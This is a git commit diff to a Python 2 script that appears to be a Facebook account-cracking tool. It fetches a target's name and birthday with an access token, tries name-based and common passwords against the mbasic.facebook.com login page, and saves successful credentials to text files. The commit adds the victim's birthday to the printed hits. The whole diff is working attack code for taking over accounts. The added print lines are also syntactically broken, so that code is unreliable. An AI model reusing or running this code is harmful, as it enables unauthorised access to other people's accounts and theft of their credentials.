eacbcd7a2cb654c3803919ab13913031110e67de
Dapunta ID <76211798+Dapunta@users.noreply.github.com>
2021-04-08 22:52:32 +0700

    Update supreme.py

--- supreme.py
+++ supreme.py
@@ -400,18 +400,19 @@ def crack1_mbasic(user):
 		a = s.get(api.format('%s?access_token=%s' % (user, toket)), headers=hea).json()
 		dp = a['first_name'].lower()
 		bk = a['last_name'].lower()
+		tl = a['birthday']
 		for pw in [dp,dp+'123',dp+'12345','sayang','bismillah','123456','anjing']:
 			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
 			xo = rex.content
 			if 'mbasic_logout_button' in xo or 'save-device' in xo:
-				print '\r   [OK] ' +user+ ' | ' +pw+ '                    '
+				print '\r   [OK] ' +user+ ' | ' +pw+ ' | ' +tl '                    '
 				Successful.append(user+' | '+pw)
 				save = open('ok.txt','a')
 				save.write(str(user)+' | '+str(pw)+'\n')
 				save.close()
 				break
 			elif 'checkpoint' in xo:
-				print '\r   [CP] ' +user+ ' | ' +pw+ '                    '
+				print '\r   [CP] ' +user+ ' | ' +pw+ ' | ' +tl '                    '
 				Checkpoint.append(user+' | '+pw)
 				save = open('cp.txt','a')
 				save.write(str(user)+' | '+str(pw)+'\n')
@@ -454,14 +455,14 @@ def cs(user):
 			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': i, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
 			xo = rex.content
 			if 'mbasic_logout_button' in xo or 'save-device' in xo:
-				print "\r   [OK]  %s | %s %s              "%(user,i,I)
+				print "\r   [OK]  %s | %s %s | %s              "%(user,i,I,tl)
 				Successful.append(user+' | '+i)
 				save = open('ok.txt','a')
 				save.write(str(user)+' | '+str(i)+'\n')
 				save.close()
 				break
 			elif 'checkpoint' in xo:
-				print "\r   [CP]  %s | %s %s              "%(user,i,I)
+				print "\r   [CP]  %s | %s %s | %s             "%(user,i,I,tl)
 				Checkpoint.append(user+' | '+i)
 				save = open('cp.txt','a')
 				save.write(str(user)+' | '+str(i)+'\n')
